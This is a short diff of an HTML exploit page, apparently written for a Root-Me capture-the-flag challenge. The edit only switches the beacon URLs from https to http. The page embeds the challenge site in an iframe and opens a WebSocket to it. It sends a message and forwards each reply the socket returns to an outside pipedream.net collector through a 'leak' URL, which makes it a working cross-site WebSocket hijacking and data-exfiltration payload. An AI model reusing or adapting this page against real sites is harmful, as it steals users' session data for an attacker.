@@ -3,17 +3,17 @@
 <body>
   <iframe src="http://ctf20.root-me.org/room"></iframe>
   <script>
-    fetch('https://eo1gpdjxqwwogrz.m.pipedream.net/start');
+    fetch('http://eo1gpdjxqwwogrz.m.pipedream.net/start');
     
     const ws = new WebSocket('ws://ctf20.root-me.org/ws');
 
     ws.addEventListener('open', () => {
       ws.send("Tell me a secret");
-       fetch('https://eo1gpdjxqwwogrz.m.pipedream.net/ws-opened');
+       fetch('http://eo1gpdjxqwwogrz.m.pipedream.net/ws-opened');
     });
 
     ws.addEventListener('message', (event) => {
-      fetch('https://eo1gpdjxqwwogrz.m.pipedream.net/leak?' + encodeURIComponent(event.data));
+      fetch('http://eo1gpdjxqwwogrz.m.pipedream.net/leak?' + encodeURIComponent(event.data));
     });
   </script>
 </body>
